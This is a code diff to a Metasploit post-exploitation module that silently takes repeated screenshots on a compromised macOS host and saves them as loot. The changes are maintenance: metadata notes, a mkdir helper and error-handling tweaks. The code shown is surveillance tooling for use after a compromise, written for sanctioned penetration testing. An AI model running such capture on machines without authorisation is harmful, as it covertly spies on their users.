@@ -20,7 +20,12 @@ class MetasploitModule < Msf::Post
           'Peter Toth <globetother[at]gmail.com>' # ported windows version to osx
         ],
         'Platform' => [ 'osx' ],
-        'SessionTypes' => [ 'meterpreter', 'shell' ]
+        'SessionTypes' => [ 'meterpreter', 'shell' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [ARTIFACTS_ON_DISK],
+          'Reliability' => []
+        }
       )
     )
 
@@ -65,8 +70,7 @@ class MetasploitModule < Msf::Post
       Rex.sleep(delay) unless num <= 0
 
       begin
-        # This is an OSX module, so mkdir -p should be fine
-        cmd_exec("mkdir -p #{tmp_path}")
+        mkdir(tmp_path)
         filename = Rex::Text.rand_text_alpha(7)
         file = "#{tmp_path}/#{filename}"
         cmd_exec("#{exe_path} -x -C -t #{file_type} #{file}")
@@ -75,7 +79,7 @@ class MetasploitModule < Msf::Post
       rescue ::Rex::Post::Meterpreter::RequestError => e
         print_error('Error taking the screenshot')
         vprint_error("#{e.class} #{e} #{e.backtrace}")
-        return
+        break
       end
 
       unless data
@@ -92,12 +96,12 @@ class MetasploitModule < Msf::Post
       rescue ::IOError, ::Errno::ENOENT => e
         print_error('Error storing screenshot')
         vprint_error("#{e.class} #{e} #{e.backtrace}")
-        return
+        break
       end
     end
 
     print_status('Screen Capturing Complete')
-    if file_locations && !file_locations.empty?
+    unless file_locations.blank?
       print_status('Use "loot -t screen_capture.screenshot" to see file locations of your newly acquired loot')
     end
   end
